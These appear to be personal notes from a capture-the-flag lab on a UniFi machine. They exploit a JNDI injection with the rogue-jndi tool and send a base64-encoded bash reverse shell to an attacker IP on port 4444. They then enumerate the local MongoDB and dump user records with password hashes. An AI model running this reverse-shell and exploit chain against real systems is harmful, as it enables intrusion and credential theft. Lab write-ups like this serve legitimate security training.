-----

## Initial Information-

### IPs

- Victim - 10.129.198.87

Date Started:2023-04-05

----
## Initial Recon

- Did the initial scan found that the following 
```shell
nmap -sV 10.129.198.87 
PORT     STATE SERVICE         VERSION                                                                              
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                         
6789/tcp open  ibm-db2-admin?                                                                                       
8080/tcp open  http-proxy                                                                                           
8443/tcp open  ssl/nagios-nsca Nagios NSCA  
```
- Opened the request in burpsuite repeater inorder manipulate the request and listened to tcp dump inorder to see what is returned 
![[Pasted image 20230406115451.png]]
```shell
# TCP dump to listen for the ldap request
sudo tcpdump -i tun0 port 1389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
06:56:31.274856 IP 10.129.198.87.59024 > 10.10.14.43.1389: Flags [S], seq 2241667316, win 64240, options [mss 1340,sackOK,TS val 580227324 ecr 0,nop,wscale 7], length 0
06:56:31.274871 IP 10.10.14.43.1389 > 10.129.198.87.59024: Flags [R.], seq 0, ack 2241667317, win 0, length 0

```

- then went to the github to get the recommeneded shell exploit https://github.com/veracode-research/rogue-jndi

- Encoded the tcp connection so that it can be passed in the URL using base 64
```shell
echo 'bash -c bash -i >&/dev/tcp/10.10.14.17/4444 0>&1' | base64

YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTcvNDQ0NCAwPiYxCg==

```
- ran the command with the 64 shell
```shell
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTcvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.17" 

+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.14.17:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.17:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.17:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.17:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.17:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.17:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.17:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.10.14.17:1389/o=groovy to artsploit.controllers.Groovy


```
- ran a nc command on 4444 in order to get the connection 
```shell
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.129.227.231] 42858



```

- got an upgradeded shell by running the following, doesnt provide auto compleate 
```shell
script /dev/null -c bash
Script started, file is /dev/null
unifi@unified:/usr/lib/unifi$ 

```

- givent hat the questions ask for the port that mongo is running on port 27117
```shell
unifi@unified:/usr/lib/unifi$ ps aux | grep mongo
ps aux | grep mongo
unifi         67  0.3  4.1 1103744 85352 ?       Sl   10:14   0:27 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi       3326  0.0  0.0  11468  1032 pts/0    S+   12:13   0:00 grep mongo
unifi@unified:/usr/lib/unifi$    
```

- found the default database based on googling 
```shell
unifi         67  0.3  4.1 1103744 85352 ?       Sl   10:14   0:27 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi       3326  0.0  0.0  11468  1032 pts/0    S+   12:13   0:00 grep mongo
unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace  
mongo --port 27117 ace                                  
MongoDB shell version v3.6.3                            
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
2023-04-11T12:34:31.298+0100 I STORAGE  [main] In File::open(), ::open for '/home/unifi/.mongorc.js' failed with No such file or directory
Server has startup warnings: 
2023-04-11T10:14:02.305+0100 I STORAGE  [initandlisten] 
2023-04-11T10:14:02.305+0100 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2023-04-11T10:14:02.305+0100 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2023-04-11T10:14:03.627+0100 I CONTROL  [initandlisten] 
2023-04-11T10:14:03.627+0100 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2023-04-11T10:14:03.627+0100 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2023-04-11T10:14:03.627+0100 I CONTROL  [initandlisten] 
> 

```
- After a little bit of research I found that you can list users of the database
```json
{ "_id" : ObjectId("61ce278f46e0fb0012d47ee4"), "name" : "administrator", "email" : "administrator@unified.htb", "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.", "time_created" : NumberLong(1640900495), "last_site_name" : "default", "ui_settings" : { "neverCheckForUpdate" : true, "statisticsPrefferedTZ" : "SITE", "statisticsPreferBps" : "", "tables" : { "device" : { "sortBy" : "type", "isAscending" : true, "initialColumns" : [ "type", "deviceName", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ], "columns" : [ "type", "deviceName", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "lastSeen", "downlink", "uplink", "dailyUsage", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ] }, "client" : { "sortBy" : "physicalName", "isAscending" : true, "initialColumns" : [ "status", "clientName", "physicalName", "connection", "ip", "experience", "Downlink", "Uplink", "dailyUsage" ], "columns" : [ "status", "clientName", "mac", "physicalName", "connection", "network", "interface", "wifi_band", "ip", "experience", "Downlink", "Uplink", "dailyUsage", "uptime", "channel", "Uplink_apPort", "signal", "txRate", "rxRate", "first_seen", "last_seen", "rx_packets", "tx_packets" ], "filters" : { "status" : { "active" : true }, "connection_type" : { "ng" : true, "na" : true, "wired" : true, "vpn" : true }, "clients_type" : { "users" : true, "guests" : true }, "device" : { "device" : "" } } }, "unifiDevice" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "unifiDeviceNetwork" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "unifiDeviceAccess" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "unifiDeviceProtect" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "unifiDeviceTalk" : { "sortBy" : "type", "isAscending" : true, "columns" : [ "type", "name", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "dailyUsage", "lastSeen", "downlink", "uplink", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ], "initialColumns" : [ "type", "name", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ] }, "insights/wifiScanner" : { "sortBy" : "apCount", "isAscending" : false, "initialColumns" : [ "apCount", "essid", "bssid", "security", "radio", "signal", "channel", "band", "bw", "oui", "date", "ap_mac" ], "columns" : [ "apCount", "essid", "bssid", "security", "radio", "signal", "channel", "band", "bw", "oui", "date", "ap_mac" ] }, "insights/wifiMan" : { "sortBy" : "date", "isAscending" : false, "initialColumns" : [ "clinet_name", "client_wifi_experience", "device_model", "device_name", "wlan_essid", "client_signal", "wlan_channel_width", "down", "up", "endPoint", "rate", "date" ], "columns" : [ "clinet_name", "client_wifi_experience", "device_model", "device_name", "wlan_essid", "client_signal", "wlan_channel_width", "down", "up", "endPoint", "rate", "date" ] } }, "topologyViewSettings" : { "showAllDevices" : true, "showAllClients" : true, "show2GClients" : true, "show5GClients" : true, "showWiredClients" : true, "showSSID" : false, "showWifiExperience" : true, "showRadioChannel" : false, "showWifiStandards" : false, "showWiredSpeed" : false, "showWiredPorts" : false, "online" : true, "offline" : true, "isolated" : true, "pending_adoption" : true, "managed_by_another_console" : true }, "preferences" : { "alertsPosition" : "top_right", "allowHiddenDashboardModules" : false, "browserLogLevel" : "INFO", "bypassAutoFindDevices" : false, "bypassConfirmAdoptAndUpgrade" : false, "bypassConfirmBlock" : false, "bypassConfirmRestart" : false, "bypassConfirmUpgrade" : false, "bypassHybridDashboardNotice" : false, "bypassDashboardUdmProAd" : false, "bypassHybridSettingsNotice" : false, "dateFormat" : "MMM DD YYYY", "dismissWlanOverrides" : false, "enableNewUI" : false, "hideV3SettingsIntro" : true, "isAppDark" : true, "isPropertyPanelFixed" : true, "isRegularGraphForAirViewEnabled" : false, "isResponsive" : false, "isSettingsDark" : true, "isUndockedByDefault" : false, "noWhatsNew" : false, "propertyPanelCollapse" : false, "propertyPanelMultiMode" : true, "refreshButtonEnabled" : false, "refreshRate" : "2MIN", "refreshRateRememberAll" : false, "rowsPerPage" : 50, "showAllPanelActions" : false, "showWifimanAppsBanner" : true, "timeFormat" : "H:mm", "use24HourTime" : true, "useBrowserTheme" : false, "useSettingsPanelView" : false, "websocketEnabled" : true, "withStickyTableActions" : true, "isUlteModalClosed" : false, "isUbbAlignmentToolModalClosed" : false, "offlineClientTimeframe" : 24 }, "preferredLanguage" : "en", "dashboardConfig" : { "lastActiveDashboardId" : "61ce269d46e0fb0012d47ec6" } }, "requires_new_password" : false, "email_alert_enabled" : true, "email_alert_grouping_enabled" : true, "html_email_enabled" : true, "is_professional_installer" : false, "push_alert_enabled" : true }
{ "_id" : ObjectId("61ce4a63fbce5e00116f424f"), "email" : "michael@unified.htb", "name" : "michael", "x_shadow" : "$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0", "requires_new_password" : false, "time_created" : NumberLong(1640909411), "last_site_name" : "default", "email_alert_enabled" : false, "email_alert_grouping_enabled" : false, "email_alert_grouping_delay" : 60, "push_alert_enabled" : false }
{ "_id" : ObjectId("61ce4ce8fbce5e00116f4251"), "email" : "seamus@unified.htb", "name" : "Seamus", "x_shadow" : "$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.", "requires_new_password" : true, "time_created" : NumberLong(1640910056), "last_site_name" : "default" }
{ "_id" : ObjectId("61ce4d27fbce5e00116f4252"), "email" : "warren@unified.htb", "name" : "warren", "x_shadow" : "$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.", "requires_new_password" : true, "time_created" : NumberLong(1640910119), "last_site_name" : "default" }
{ "_id" : ObjectId("61ce4d51fbce5e00116f4253"), "email" : "james@unfiied.htb", "name" : "james", "x_shadow" : "$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1", "requires_new_password" : false, "time_created" : NumberLong(1640910161), "last_site_name" : "default" }	
```

----
## Foothold

---
## Tags
#Web
#VulnerabilityAssessment
#Databases
#Injection
#CustomApplications
#OutdatedSoftware
#MongoDB
#Java
#Reconnaissance
#ClearTextCredentials
#DefaultCredentials 
#CodeInjection

----

## Resources
- Default database - https://www.w3resource.com/mongodb/databases-documents-collections.php#:~:text=Default%20database%20of%20MongoDB%20is,list%20of%20all%20the%20databases.
- List users of the database - https://community.ui.com/questions/Password-recovery-db-admin-find-empty/d2d76f3b-051d-473d-b164-9c2d1b469349
----
